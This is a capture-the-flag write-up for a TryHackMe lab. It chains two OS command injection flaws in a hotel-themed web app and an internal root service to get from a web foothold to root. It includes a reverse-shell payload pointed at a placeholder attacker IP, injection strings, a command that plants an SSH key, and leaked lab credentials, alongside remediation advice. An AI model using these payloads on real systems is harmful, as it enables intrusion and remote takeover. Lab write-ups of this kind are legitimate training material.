# TryHackMe: Infinity Pool — Writeup

**Category:** Boot2Root  
**Difficulty:** Medium  
**Points:** 90  

## Summary

Infinity Pool is a Boot2Root challenge themed around a "smart" hotel, Byte Lotus. The box exposes a public-facing web application with a hidden staff-only diagnostics page vulnerable to OS command injection, which grants an initial foothold. From there, enumeration reveals three localhost-only services: an internal configuration service, a FreePBX telephony portal, and a root-owned automation service. The FreePBX voicemail inbox — reached through an SSH local port-forward — hides the authentication key needed to reach the automation service, which is itself vulnerable to command injection, leading to full root compromise.

**Chain overview:**  

1. Recon reveals a disallowed `/status` endpoint in `robots.txt`
2. Front-end JS comment confirms `/status` posts to a legacy `/internal/netcheck` handler
3. `/internal/netcheck` is vulnerable to OS command injection via an unsanitized `ping` call → shell as `web`
4. Local enumeration reveals an internal config service (port 3000) leaking FreePBX UCP credentials, and a root-owned automation service (port 9000)
5. An SSH key is planted via the same command injection, enabling a local port-forward into the loopback-only FreePBX UCP portal (port 8080)
6. Logging into FreePBX UCP with the leaked credentials reveals a voicemail whose Caller ID field contains the automation service's Bearer key
7. The automation service's `/jobs/export` endpoint is also vulnerable to command injection → RCE as `root`

## Recon

An `nmap` scan of the target revealed two externally-reachable ports:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn
```

The HTTP service is a Flask app served via `gunicorn`, titled "Byte Lotus — Stay Noticed". `nmap`'s `http-robots.txt` script flagged two disallowed entries:

```
/internal/
/status
```

Both are interesting since they are excluded from search engines but not actually protected from direct access.

## Finding the vulnerable endpoint

Viewing the page source and pulling up the bundled `app.js` revealed a developer comment:

<img width="547" height="105" alt="Developer comment revealing the internal endpoints" src="https://github.com/user-attachments/assets/145eb28c-d6ba-4f79-98fa-707ece6ba3a3" />


```js
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
```

This confirms `/status` is a staff diagnostics tool that isn't linked anywhere in the public navigation, but is still reachable directly — a classic case of "security through obscurity" that fails because the client-side code leaks the reference.

Visiting `/status` presents a simple form for pinging a host to "confirm a remote property responds before routing a guest transfer" (in keeping with the hotel theme).

## Vulnerability #1 — Command Injection in `/internal/netcheck`

Command injection was first confirmed with a proof-of-concept payload (below), then, after escalating that to a reverse shell as `web`, the application's source was read directly from disk on the box to confirm the root cause:

```bash
cat /var/www/infinity_pool/edge/app.py
```

```python
@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    ...
    proc = subprocess.run(
        f"ping -c 1 {host}",
        shell=True,
        capture_output=True,
        text=True,
        timeout=15,
    )
    output = proc.stdout + proc.stderr
    return render_template("status.html", host=host, output=output)
```

User input (`host`) is concatenated directly into a shell string and executed with `shell=True`, with no validation or escaping. This allows arbitrary command injection via shell metacharacters like `;`.

**Proof of concept:**

```
127.0.0.1;pwd
```
<img width="1109" height="632" alt="Vulnerable" src="https://github.com/user-attachments/assets/6aa2a657-03f1-4487-a3d2-8a26b01c7e48" />

The response included `/var/www/infinity_pool/edge`, confirming that the
application executed the injected `pwd` command.


### Gaining a shell

Set up a listener locally:

```bash
nc -lvnp 4444
```

Sent a reverse shell payload through the vulnerable `host` parameter:

```
127.0.0.1;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

This returned an interactive shell as `web`.

### User flag

```bash
find / -name "user.txt" 2>/dev/null
# /home/web/user.txt
cat /home/web/user.txt
```

**User flag:** `THM{...}` *(redacted — flags are intentionally omitted from this writeup; complete the room yourself to obtain them)*

## Privilege Escalation

Standard privesc checks (`sudo -l`, SUID binaries, capabilities, cron jobs) did not reveal any immediately exploitable misconfiguration — `sudo -l` required a password, and the SUID binary list was standard for the OS. This ruled out the obvious local paths and pointed toward the network side of the box instead.

### Enumerating internal services

Checking listening ports revealed three services bound to `localhost` only:

```bash
ss -lntup
```

```
tcp  LISTEN  127.0.0.1:3000   # internal config service
tcp  LISTEN  127.0.0.1:8080   # FreePBX UCP
tcp  LISTEN  127.0.0.1:9000   # automation service
```

All three are internal-only — invisible from outside the box, but reachable now that there's a foothold on it.

```bash
curl -sS http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

Critically, `"runs_as": "root"` — this service is a high-value target, but its `/jobs/export` endpoint requires a Bearer key that isn't disclosed anywhere in this response.

```bash
curl -sS http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

> **A note on credentials in this writeup:** the password and automation key shown are lab-generated values specific to this TryHackMe room's telephony/automation services — not real-world secrets. They're included here because they're integral to reproducing the exploit chain, unlike the room's flags, which are omitted since they serve as individual proof-of-completion.

This internal service over-shares secrets: credentials for a FreePBX telephony portal (`127.0.0.1:8080/ucp`) that's also bound to localhost only, and — notably — the ops note flags that the FreePBX UCP account is still on its default template credentials.

### Confirming what the automation service expects

The service's systemd unit confirmed how it's run and where its own secrets live:

```bash
cat /etc/systemd/system/cc-automation.service
```

```
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
    --workers 1 \
    --bind 127.0.0.1:9000 \
    wsgi:app
```

The working directory itself is not readable as `web`:

```bash
ls -la /var/www/infinity_pool/automation/
# ls: cannot open directory '...': Permission denied
```

A broad search for other readable leads related to `automation` (readable files system-wide, `/proc/<pid>/environ` for the running gunicorn processes, Redis, MySQL) turned up nothing usable. These enumeration attempts did not reveal the Bearer key to the `web` user. The intended path instead appeared to lead through the exposed FreePBX portal.

### Reaching FreePBX UCP via an SSH local port-forward

Since `127.0.0.1:8080/ucp` is loopback-only on the target, it needs to be tunneled to the attacker's own machine to browse it. A convenient way in is to plant an SSH public key using the same command injection primitive from Vulnerability #1, then connect over SSH with a local port-forward.

**1. Generate a local key pair:**
```bash
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
base64 -w0 ctf_key.pub
```

**2. Plant the public key on the target via the injection point:**
```bash
curl -sS -X POST http://<TARGET_IP>/internal/netcheck \
  --data-urlencode "host=127.0.0.1;mkdir -p /home/web/.ssh;echo <BASE64_PUBKEY>|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#"
```

**3. SSH in with a local port-forward to the UCP portal:**
```bash
ssh -o IdentitiesOnly=yes -i ctf_key -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

With the tunnel open, `http://127.0.0.1:8080/ucp` in a local browser now reaches the target's internal FreePBX portal. Logging in with the leaked template-account credentials (`FreePBXUCPTemplateCreator` / the password from `/api/config`) succeeded, confirming that the credentials referenced in the operational note had not been rotated.

<img width="1117" height="583" alt="FreePBX User Control Panel login" src="https://github.com/user-attachments/assets/f831bfd7-7159-49ea-b2cc-3bb734e9fb1f" />


### Finding the automation key in a voicemail

Inside FreePBX UCP, the **Voicemail** widget (added from the dashboard's widget picker) shows a single message in the inbox. Its Caller ID (CID) field contains the automation service's Bearer key in plain text:

```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```
<img width="1165" height="477" alt="Automation key disclosed in the voicemail inbox" src="https://github.com/user-attachments/assets/42d1c1ff-6b58-4e86-b0b8-3a1f986d2ac4" />


The `<9000>` suffix matching the automation service's port is a strong confirmation this is the right key for the right service. This is a deliberately obscure hiding spot — a legitimate secret disclosed through a channel (a voicemail Caller ID) that isn't typically monitored for that purpose, reachable only once the FreePBX credentials are compromised.

## Vulnerability #2 — Command Injection in `/jobs/export` (root service)

With the key in hand, it authenticates successfully against `/jobs/export`:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;id;#"}'
```

```json
{
  "command": "tar czf /var/automation/exports/test;id;#.tgz /var/automation/data 2>&1",
  "output": "uid=0(root) gid=0(root) groups=0(root)\ntar: Cowardly refusing to create an empty archive\n..."
}
```

The `output` field confirms `id` executed as `uid=0(root)`. The response also leaks the shape of the command template the service builds server-side:

```bash
tar czf /var/automation/exports/{report}.tgz /var/automation/data
```

The automation service's own source wasn't readable as `web` (the working directory returned `Permission denied`), so this couldn't be confirmed directly against its code the way it was for `netcheck`. But the reflected command and the observed handling of shell metacharacters (`;` acting as a command separator, `#` truncating the rest of the line) show that the `report` value is interpolated into a command interpreted by a shell, without adequate validation — the same class of vulnerability as `/internal/netcheck`, just in a different service.

### Root flag



```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

```json
{
  "command": "tar czf /var/automation/exports/x;cat /root/root.txt;#.tgz /var/automation/data",
  "output": "THM{...}\ntar: Cowardly refusing to create an empty archive\n..."
}
```
<img width="1437" height="140" alt="Root-level command execution through the automation service" src="https://github.com/user-attachments/assets/41ec5c9b-6310-4e46-9227-e98f1f15d338" />

**Root flag:** `THM{...}` *(redacted — flags are intentionally omitted from this writeup; complete the room yourself to obtain them)*

### Why the payload works

The payload `x;cat /root/root.txt;#` is interpolated into:

```bash
tar czf /var/automation/exports/x;cat /root/root.txt;#.tgz /var/automation/data
```

The observed behavior shows that the constructed command is interpreted by a shell, which treats `;` as a command separator rather than a literal filename character. The shell therefore parses the input as three sequential commands:

1. `tar czf /var/automation/exports/x` — fails (incomplete tar invocation), but harmless
2. `cat /root/root.txt` — the injected payload, runs as `root`, prints the flag
3. `#.tgz /var/automation/data` — the `#` begins a shell comment, so the rest of the line is discarded

The service captures the resulting command output and includes it in the JSON response. This causes the contents of the flag file to be returned even though the surrounding `tar` command fails.

## Root Cause

Both vulnerabilities share the exact same root cause: **unsanitized user input concatenated into a shell command string, then interpreted by a shell**. For `/internal/netcheck` this was confirmed directly in source as `subprocess.run(f"ping -c 1 {host}", shell=True, ...)`; for `/jobs/export`, the same pattern is the most consistent explanation for the observed behavior, though the service's own source wasn't directly readable to confirm it.

This is a textbook OS command injection pattern. The fix in both cases is the same:

- Avoid `shell=True` entirely where possible; pass arguments as a list instead:
  ```python
  subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=15)
  ```
- If shell features are genuinely required, strictly validate/allowlist input (e.g., only allow valid IPv4/hostname characters) before use.
- Apply the principle of least privilege: the automation service should not run as `root` for a task like archiving exports.
- Don't expose internal debugging/config endpoints (like `/api/config`) that leak credentials, even on "internal only" services — defense in depth matters, since a foothold elsewhere on the box removes that boundary.
- Rotate default/template credentials before deployment — the FreePBX UCP account was flagged internally as never having been rotated, and turned out to be exploitable exactly because of that.
- Don't use user-facing fields like Caller ID as a channel for secrets — anything visible to an authenticated portal user is effectively disclosed the moment that portal's credentials leak.

## Lessons Learned

- **Client-side code can leak server-side attack surface.** The front-end JS comment directly pointed to the vulnerable endpoint.
- **`robots.txt` is not access control.** It tells search engines not to index a path — it does nothing to prevent a browser or `curl` from requesting it.
- **Internal-only services aren't safe by default.** Binding a service to `127.0.0.1` protects against external network access, but any foothold on the host itself removes that protection entirely — internal APIs need their own authentication and input validation.
- **The same code smell often repeats across a codebase.** Finding one `shell=True` + string interpolation instance is a strong signal to look for the same pattern elsewhere, which is exactly how the second, root-level vulnerability was found.
- **Secrets can hide in unexpected places.** The automation key wasn't in any config file reachable by the low-privilege user — it was disclosed through a completely different subsystem (a VoIP voicemail inbox), reachable only by first pivoting through leaked credentials and a port-forward.
- **A dead end is useful information too.** Ruling out `automation.env`, `/proc/<pid>/environ`, Redis, and MySQL as sources for the key wasn't wasted effort — it correctly indicated the answer lay outside the filesystem entirely, which is what led to checking the FreePBX portal properly.
